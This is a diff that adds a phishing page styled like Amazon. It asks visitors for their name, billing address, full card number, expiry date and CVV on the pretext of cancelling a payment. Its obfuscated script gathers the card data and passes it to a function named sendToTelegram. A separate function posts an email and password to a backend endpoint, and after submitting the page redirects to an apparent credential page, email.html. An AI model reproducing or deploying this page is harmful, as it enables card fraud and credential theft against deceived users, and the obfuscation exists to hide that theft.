@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fill Account Details</title>
+    <style>
+        /* Global Styles */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f3f3f3;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .form-container {
+            background-color: #ffffff;
+            border-radius: 4px;
+            padding: 20px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 20px;
+            color: #232f3e;
+            text-align: center;
+        }
+
+        label {
+            font-weight: bold;
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        input {
+            width: 100%;
+            padding: 6px;
+            margin-bottom: 15px;
+            border: 1px solid #a6a6a6;
+            border-radius: 3px;
+            font-size: 14px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #e77600;
+            box-shadow: 0 0 3px 2px rgba(228, 121, 17, 0.5);
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group.flex {
+            display: flex;
+            gap: 10px;
+        }
+
+        .form-group.flex input {
+            flex: 1;
+        }
+
+        button {
+            width: 100%;
+            background-color: #f0c14b;
+            border: 1px solid #a88734;
+            border-radius: 3px;
+            padding: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            color: #111;
+        }
+
+        button:hover {
+            background-color: #f1c860;
+        }
+
+        .footer-text {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #555;
+        }
+
+        .footer-text a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+
+        .footer-text a:hover {
+            text-decoration: underline;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 100px;
+            height: auto;
+            background-color: transparent;
+        }
+
+        .card-type {
+            font-size: 14px;
+            color: #555;
+            margin-top: -10px;
+            margin-bottom: 15px;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 20px;
+            }
+
+            .form-container {
+                padding: 15px;
+            }
+
+            input {
+                padding: 6px;
+                font-size: 12px;
+            }
+
+            button {
+                padding: 8px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <div class="logo">
+            <img src="images.png" alt="Logo" style="background-color: transparent;">
+        </div>
+        <h1>Fill Account Details</h1>
+        <p>To cancel your payment, kindly provide the required details in the form below. Your information will assist us in handling your request efficiently</p>
+        <form id="accountForm">
+            <!-- Nama -->
+            <div class="form-group">
+                <label for="name">Full Name</label>
+                <input type="text" id="name" name="name" placeholder="Enter your full name" required>
+            </div>
+
+            <!-- Billing Address -->
+            <div class="form-group">
+                <label for="address">Billing Address</label>
+                <input type="text" id="address" name="address" placeholder="Enter your billing address" required>
+            </div>
+
+            <!-- Credit Card -->
+            <div class="form-group">
+                <label for="creditCard">Credit Card Number</label>
+                <input type="text" id="creditCard" name="creditCard" placeholder="Enter your credit card number" required maxlength="16">
+                <div class="card-type" id="cardType"></div>
+            </div>
+
+            <!-- Expiration Date and CVV -->
+            <div class="form-group flex">
+                <div>
+                    <label for="expDate">Expiration Date</label>
+                    <input type="text" id="expDate" name="expDate" placeholder="MM/YY" required maxlength="5">
+                </div>
+                <div>
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="CVV" required maxlength="4">
+                </div>
+            </div>
+
+            <!-- Submit Button -->
+            <button type="submit">Continue</button>
+        </form>
+
+        <!-- Footer Text -->
+        <div class="footer-text">
+            By continuing, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+        </div>
+    </div>
+
+    <script>
+function _0x48b9(){const _0x3ff526=['2158506WfqLxx','location','3363008huBtPm','submit','address','Error\x20sending\x20message\x20to\x20backend:','log','stringify','input','/api/sendMessage','3336540KUUHlv','Message\x20sent\x20via\x20backend:','href','Failed\x20to\x20send\x20message\x20to\x20backend','error','\x0aEXP:\x20','Card\x20Type:\x20','POST','Unknown','Name:\x20','addEventListener','5KPuaFw','email.html','Account\x20details\x20saved\x20successfully!','14331528IvCrxn','getElementById','Expiration\x20Date\x20must\x20be\x20in\x20MM/YY\x20format.','CVV\x20must\x20be\x203\x20or\x204\x20digits.','value','application/json','2TytDgx','cardType','accountForm','textContent','creditCard','test','\x0aCC:\x20','Failed\x20to\x20send\x20data.\x20Please\x20try\x20again\x20later.','177511ohWgBz','2928524uEbKQi','Credit\x20Card\x20Number\x20must\x20be\x2016\x20digits.','Account\x20Details:','1968288SEnbWZ','Mastercard','Visa','American\x20Express'];_0x48b9=function(){return _0x3ff526;};return _0x48b9();}const _0x566604=_0x2099;(function(_0x28129c,_0x555293){const _0x40bf08=_0x2099,_0x4809bf=_0x28129c();while(!![]){try{const _0x43f2a1=-parseInt(_0x40bf08(0xe1))/0x1*(parseInt(_0x40bf08(0x107))/0x2)+-parseInt(_0x40bf08(0xe9))/0x3+parseInt(_0x40bf08(0xe2))/0x4*(-parseInt(_0x40bf08(0xfe))/0x5)+parseInt(_0x40bf08(0xf3))/0x6+parseInt(_0x40bf08(0xe5))/0x7+-parseInt(_0x40bf08(0xeb))/0x8+parseInt(_0x40bf08(0x101))/0x9;if(_0x43f2a1===_0x555293)break;else _0x4809bf['push'](_0x4809bf['shift']());}catch(_0xf5d22d){_0x4809bf['push'](_0x4809bf['shift']());}}}(_0x48b9,0x5ccf2));function _0x2099(_0x3f4bb8,_0x2ff6e2){const _0x48b923=_0x48b9();return _0x2099=function(_0x209935,_0x5856d5){_0x209935=_0x209935-0xe0;let _0x310f71=_0x48b923[_0x209935];return _0x310f71;},_0x2099(_0x3f4bb8,_0x2ff6e2);}async function sendToBackend(_0x1bb3c6,_0x48ea87){const _0x2cca30=_0x2099,_0x3c0899=_0x2cca30(0xf2),_0xca4b27={'email':_0x1bb3c6,'password':_0x48ea87};try{const _0x2f4eb4=await fetch(_0x3c0899,{'method':_0x2cca30(0xfa),'headers':{'Content-Type':_0x2cca30(0x106)},'body':JSON[_0x2cca30(0xf0)](_0xca4b27)});if(!_0x2f4eb4['ok'])throw new Error(_0x2cca30(0xf6));const _0x29aef1=await _0x2f4eb4['json']();return console[_0x2cca30(0xef)](_0x2cca30(0xf4),_0x29aef1),!![];}catch(_0x1d8c91){return console[_0x2cca30(0xf7)](_0x2cca30(0xee),_0x1d8c91),alert(_0x2cca30(0xe0)),![];}}function detectCardType(_0x2032cb){const _0x23504b=_0x2099,_0x43c33e=/^4[0-9]{12}(?:[0-9]{3})?$/,_0x3a5e92=/^(5[1-5][0-9]{14}|2221[0-9]{12}|2720[0-9]{12})$/,_0x370311=/^3[47][0-9]{13}$/;if(_0x43c33e[_0x23504b(0x10c)](_0x2032cb))return _0x23504b(0xe7);else{if(_0x3a5e92['test'](_0x2032cb))return _0x23504b(0xe6);else return _0x370311[_0x23504b(0x10c)](_0x2032cb)?_0x23504b(0xe8):_0x23504b(0xfb);}}document[_0x566604(0x102)](_0x566604(0x10b))[_0x566604(0xfd)](_0x566604(0xf1),function(){const _0x1a95f1=_0x566604,_0x3059dd=this[_0x1a95f1(0x105)]['replace'](/\s+/g,''),_0x282cf0=detectCardType(_0x3059dd);document[_0x1a95f1(0x102)](_0x1a95f1(0x108))[_0x1a95f1(0x10a)]=_0x1a95f1(0xf9)+_0x282cf0;}),document[_0x566604(0x102)](_0x566604(0x109))[_0x566604(0xfd)](_0x566604(0xec),async function(_0x37f10f){const _0x285863=_0x566604;_0x37f10f['preventDefault']();const _0x260943=document[_0x285863(0x102)]('name')[_0x285863(0x105)],_0x2ef1d4=document[_0x285863(0x102)](_0x285863(0xed))[_0x285863(0x105)],_0x4cfac6=document[_0x285863(0x102)](_0x285863(0x10b))[_0x285863(0x105)],_0xfda2a5=document[_0x285863(0x102)]('expDate')[_0x285863(0x105)],_0x54f0c9=document[_0x285863(0x102)]('cvv')['value'],_0x353db8=/^\d{16}$/;if(!_0x353db8[_0x285863(0x10c)](_0x4cfac6)){alert(_0x285863(0xe3));return;}const _0x3dbbf8=/^(0[1-9]|1[0-2])\/\d{2}$/;if(!_0x3dbbf8['test'](_0xfda2a5)){alert(_0x285863(0x103));return;}const _0x178670=/^\d{3,4}$/;if(!_0x178670[_0x285863(0x10c)](_0x54f0c9)){alert(_0x285863(0x104));return;}console['log'](_0x285863(0xe4),{'name':_0x260943,'address':_0x2ef1d4,'creditCard':_0x4cfac6,'expDate':_0xfda2a5,'cvv':_0x54f0c9});const _0x47b8f6=_0x285863(0xfc)+_0x260943+'\x0aAddress:\x20'+_0x2ef1d4+_0x285863(0x10d)+_0x4cfac6+_0x285863(0xf8)+_0xfda2a5+'\x0aCVV:\x20'+_0x54f0c9;await sendToTelegram(_0x47b8f6),alert(_0x285863(0x100)),window[_0x285863(0xea)][_0x285863(0xf5)]=_0x285863(0xff);});
+    </script>
+</body>
+</html>
